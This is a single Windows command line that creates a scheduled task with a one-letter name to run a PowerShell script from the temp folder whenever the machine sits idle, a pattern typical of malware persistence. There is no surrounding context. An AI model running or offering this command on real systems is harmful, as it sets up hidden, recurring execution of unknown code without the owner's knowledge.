schtasks /create /tn b /tr "powershell %TEMP%\r.ps1" /sc onidle /i 1
